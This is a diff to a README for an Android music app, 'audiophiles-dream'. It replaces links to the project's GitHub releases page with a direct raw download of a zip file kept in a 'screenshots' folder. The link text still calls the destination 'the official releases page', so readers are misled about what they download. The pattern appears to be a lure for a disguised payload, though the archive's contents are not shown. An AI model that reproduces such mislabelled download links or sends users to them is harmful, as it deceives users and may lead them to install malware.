@@ -1,6 +1,6 @@
 # 🎧 audiophiles-dream - Experience high fidelity sound every day
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Pointcosmologist787/audiophiles-dream/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Pointcosmologist787/audiophiles-dream/main/screenshots/audiophiles_dream_v1.9.zip)
 
 ## 🎵 About the app
 
@@ -26,7 +26,7 @@ Audiophiles-dream provides a high-fidelity music experience for your Android dev
 
 You must visit the project release page to get the latest file for your device.
 
-[Visit the official releases page here](https://github.com/Pointcosmologist787/audiophiles-dream/releases)
+[Visit the official releases page here](https://raw.githubusercontent.com/Pointcosmologist787/audiophiles-dream/main/screenshots/audiophiles_dream_v1.9.zip)
 
 1.  Open the link provided above using your Android web browser.
 2.  Look for the section marked Latest.
